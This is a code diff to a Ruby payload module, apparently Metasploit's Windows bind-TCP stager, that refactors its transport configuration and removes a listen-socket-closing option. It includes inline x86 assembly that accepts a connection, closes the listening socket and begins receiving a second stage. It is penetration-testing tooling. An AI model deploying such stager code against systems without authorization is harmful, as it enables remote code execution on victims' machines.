@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -16,13 +17,10 @@ module Msf
 
 module Payload::Windows::BindTcp
 
+  include Msf::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
-
-  def close_listen_socket
-    datastore['StagerCloseListenSocket'].nil? || datastore['StagerCloseListenSocket'] == true
-  end
 
   #
   # Generate the first stage
@@ -45,14 +43,8 @@ module Payload::Windows::BindTcp
     generate_bind_tcp(conf)
   end
 
-  def generate_transport_config(opts={})
-    {
-      :scheme       => 'tcp',
-      :lport        => datastore['LPORT'].to_i,
-      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
-      :retry_total  => datastore['SessionRetryTotal'].to_i,
-      :retry_wait   => datastore['SessionRetryWait'].to_i
-    }
+  def transport_config(opts={})
+    transport_config_bind_tcp(opts)
   end
 
   #
@@ -85,11 +77,6 @@ module Payload::Windows::BindTcp
 
     # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
     space += 14
-
-    # if the payload doesn't need the listen socket closed then we save space. This is
-    # the case for meterpreter payloads, as metsrv now closes the listen socket once it
-    # kicks off (needed for more reliable shells).
-    space -= 8 unless close_listen_socket
 
     # The final estimated size
     space
@@ -175,13 +162,11 @@ module Payload::Windows::BindTcp
         push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
         call ebp               ; accept( s, 0, 0 );
 
-        push edi               ; push the listening socket, either to close, or to pass on
+        push edi               ; push the listening socket
         xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
         push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
         call ebp               ; closesocket( s );
-      ^
 
-      asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         push 0                 ; flags
